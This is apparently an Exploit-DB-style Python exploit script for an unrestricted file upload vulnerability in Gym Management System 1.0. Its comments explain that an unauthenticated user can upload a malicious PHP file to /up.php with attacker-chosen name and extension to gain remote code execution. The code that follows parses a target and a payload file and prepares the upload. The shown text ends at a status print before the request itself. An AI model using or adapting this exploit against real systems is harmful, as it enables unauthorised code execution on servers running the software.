# Exploit Title: Gym Management System 1.0 - Unrestricted File Upload
# Exploit Author: https://github.com/sMMiles
# Date: 01/09/2020
#
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
#
# Tested using: Python 3.8.3
# Vulnerability Description:
# Gym Management System 1.0 suffers from an Unrestricted File Upload vulnerability allowing attackers to gain Remote Code Execution by uploading a malicious PHP file.
#
# The /up.php page allows unauthenticated users to upload a file along with "name" and "ext" parameters, processes it further if the content type indicates it's an image, then saves it as "<name>.<ext>".
# As we fully control the uploaded filepath we can now upload a file anywhere on the machine, so we can now upload our malicious PHP file to the current directory and access it from the page's root.

import os, argparse, requests

parser = argparse.ArgumentParser(description='Exploit the vulnerable /up.php file in Gym Management Software 1.0 to upload a file.')

parser.add_argument('-t', '--target', dest='target', required=True, help='Target IP (e.g: 10.10.10.69:8080)')
parser.add_argument('-f', '--file', dest='file', required=True, help='File to be uploaded (e.g: malicious.php)')

args = parser.parse_args()

if args.target[-1] == '/': args.target = args.target[:-1]

files = { 'image': open(args.file, 'rb') }

filename, ext = os.path.splitext(args.file)
filename = os.path.basename(filename)

print('Uploading %s%s to %s/up.php...' % (filename, ext, args.target))
